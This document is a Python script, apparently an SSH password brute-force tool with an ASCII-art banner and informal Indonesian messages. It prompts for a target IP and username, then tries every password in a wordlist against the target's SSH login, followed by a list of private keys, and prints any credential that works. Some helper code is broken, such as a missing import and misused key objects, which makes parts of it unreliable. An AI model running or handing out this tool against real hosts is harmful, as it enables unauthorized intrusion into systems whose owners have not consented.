

#                                                                                .-'''-.                   _..._                                 .--.                                             
#                                                                               '   _    \              .-'_..._''.                              |  |                                             
# /|                                       __.....__                          /   /` '.   \           .' .'      '.\     __.....__               |  |                                 .           
# ||                                   .-''         '.                  _.._ .   |     \  '          / .'            .-''         '.             |  |                               .'|           
# ||        .-,.--.              .|   /     .-''"'-.  `.              .' .._||   '      |  '.-,.--. . '             /     .-''"'-.  `.           |  |                              <  |           
# ||  __    |  .-. |           .' |_ /     /________\   \             | '    \    \     / / |  .-. || |            /     /________\   \          |  |                               | |           
# ||/'__ '. | |  | | _    _  .'     ||                  |           __| |__   `.   ` ..' /  | |  | || |            |                  |          |  |                 _         _   | | .'''-.    
# |:/`  '. '| |  | || '  / |'--.  .-'\    .-------------'          |__   __|     '-...-'`   | |  | |. '            \    .-------------'          |  |               .' |      .' |  | |/.'''. \   
# ||     | || |  '-.' | .' |   |  |   \    '-.____...---.             | |                   | |  '-  \ '.          .\    '-.____...---.          |  |              .   | /   .   | /|  /    | |   
# ||\    / '| |    /  | /  |   |  |    `.             .'              | |                   | |       '. `._____.-'/ `.             .'           |  |            .'.'| |// .'.'| |//| |     | |   
# |/\'..' / | |   |   `'.  |   |  '.'    `''-...... -'                | |                   | |         `-.______ /    `''-...... -'             |  |          .'.'.-'  /.'.'.-'  / | |     | |   
# '  `'-'`  |_|   '   .'|  '/  |   /                                  | |                   |_|                  `                               |  |          .'   \_.' .'   \_.'  | '.    | '.  
#                  `-'  `--'   `'-'                                   |_|                                                                        '--'                               '---'   '---' 

# =================== Initialized Libraries =================
import paramiko
import os
import logging
import re
import time
import multiprocessing

# =================== Logging Configuration ====================
logging.getLogger().setLevel(logging.INFO)  # Set the root logger level to INFO
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# User Choices =================================
USERNAME = 'admin'
SSH_PORT = 22
SSH_TIMEOUT = 10
SSH_KEY_FILE = 'id_rsa'
SSH_SERVER_HOST = '192.168.1.1'

# =================== SSH Connection Function =================
def connect_ssh(username, ssh_port, ssh_timeout, ssh_key_file, ssh_server_host):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ssh_server_host, port=ssh_port, username=username, key_filename=ssh_key_file, timeout=ssh_timeout)
        return client
    except paramiko.AuthenticationException:
        print(f" [🔐]Authentication failed. Cek lagi coba {username}")
        print(time.strftime ("%Y-%m-%d"))
        return None
    except paramiko.SSHException as e:
        print(time.strftime ("%Y-%m-%d"))
        print(f"[⧲] Error connecting ᢳ  SSH server: {e}")
        return None
    except Exception as e:
        print(f"Absolute Cinema: {e}")
        print(time.strftime ("%Y-%m-%d"))
        return None

# =================== Optional Function can be used any utilities =================
WORDLIST = 'wordlistRandom.txt'
REGEX_WORDLIST = 'wordlistRegexGenerator.txt'

# ======================= Input Addtional Utilities ===========================
print(f"Running everything ....")
print(time.strftime ("%Y-%m-%d"))

def generate_wordlist_regex(file_path, min_length, max_length):
    if os.path.isfile(file_path):
        with open(file_path, 'w') as f:
            for length in range(min_length, max_length + 1):
                for char in string.ascii_lowercase:
                    f.write(f"{char}{{{length}}}\n")
    else:
        print(f"Wordlist file '{file_path}' notfund!")

# ========================= Load Passwords Function ==========================
def load_passwords(file_path):
    if os.path.isfile(file_path):
        with open(file_path, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    else:
        print(f"Passwords file '{file_path}' notfund!")
        passwords = []
    return passwords
# ========================= Load Passwords ==========================
passwords = load_passwords('.txt')
# ========================= Load SSH Keys ==========================
if os.path.isfile('ssh_keys.txt'):
    with open('ssh_keys.txt', 'r') as f:
        keys = [line.strip() for line in f.readlines()]
else:
    print("SSH ⎇ file, not funds!")
    keys = []

# ========================= Connect to SSH SERVER =========================
logging.basicConfig(level=logging.INFO)
logging.getLogger().setLevel(logging.INFO)

def ssh_connect(target, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    logging.info(f"Test konek ke {target}")
    
    try:
        ssh.connect(target, port=22, username=username, password=password)
        logging.info(f"Koneksi ke {target}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        logging.error("[⛌] ]Authentication failed.")
    except paramiko.BadHostKeyException:
        logging.error("[⛌] Bad host key.")
    except paramiko.SSHException as e:
        logging.error(f" SSH ᢳ error: {e}")
    except paramiko.ssh_exception.NoValidConnectionsError:
        logging.error("Gak Valid nih SSH nya ⛌.")
    except Exception as e:
        logging.error(f"Absolute Cinema: {e}")
    
    ssh.close()
    return False
# ========================= Load Targets Function ==========================
def load_targets(file_path):
    if os.path.isfile(file_path):
        with open(file_path, 'r') as f:
            targets = [line.strip() for line in f.readlines()]
    else:
        print(f"Targets file '{file_path}' not found!")
        targets = []
    return targets
# ========================== Main Function ===============================
if __name__ == '__main__':
    # Prompt user for target IP address, username, and password file location
    target = input('Please enter target IP address: ')
    username = input('Please enter username to bruteforce: ')
    password_file = input('Please enter location of the password file: ')

    # Check if the password file exists
    if not os.path.isfile(password_file):
        print("Password file does not exist!")
        exit(1)

    # Open password file and try each password
    with open(password_file, 'r') as file:
        for line in file:
            password = line.strip()
            try:
                if ssh_connect(target, username, password):
                    print('Password found: ' + password)
                    exit(0)
                else:
                    print('Incorrect password: ' + password)
            except Exception as e:
                print(f"Error: {e}")
    
    print('Password not found in the provided file.')

    # If no password is found, try using SSH keys
    if keys:
        for key in keys:
            try:
                private_key = paramiko.RSAKey.from_private_key_file(key)
                if ssh_connect(target, username, private_key):
                    print('Password found using SSH key: ' + key)
                    exit(0)
                else:
                    print('Incorrect password using SSH key: ' + key)
            except paramiko.SSHException as e:
                print(f"Error: {e}")